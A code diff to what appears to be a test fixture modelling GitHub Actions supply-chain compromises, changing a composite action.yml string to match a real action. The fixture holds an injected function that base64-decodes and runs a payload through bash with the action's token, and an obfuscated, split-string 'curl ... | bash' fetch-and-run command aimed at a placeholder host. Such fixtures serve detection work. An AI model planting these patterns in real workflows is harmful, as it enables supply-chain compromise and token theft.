@@ -13,7 +13,8 @@ const node = (extra = "") => ({
 export const TJ_ACTIONS = { before: node(), after: node(`async function updateFeatures(token) {\n  const { stdout } = await exec("bash", ["-c", Buffer.from("${payload}", "base64").toString("utf-8")]);\n  process.stdout.write(stdout);\n}\nupdateFeatures(process.env.INPUT_TOKEN);\n`) };
 
 const composite = (install) => ({
-  "action.yml": "name: setup\nruns:\n  using: composite\n  steps:\n    - run: $GITHUB_ACTION_PATH/install.sh\n      shell: bash\n    - run: ${{ github.action_path }}/install.sh\n      shell: bash\n",
+  // As the real action calls it: "$GITHUB_ACTION_PATH/install.sh" in a block scalar.
+  "action.yml": "name: setup\nruns:\n  using: composite\n  steps:\n    - name: install reviewdog\n      run: |\n        set -eu\n        \"$GITHUB_ACTION_PATH/install.sh\"\n      shell: sh\n",
   "install.sh": install,
 });
 const encoded = Buffer.from(j("cu", "rl -s https://example.invalid/x | ba", "sh")).toString("base64");
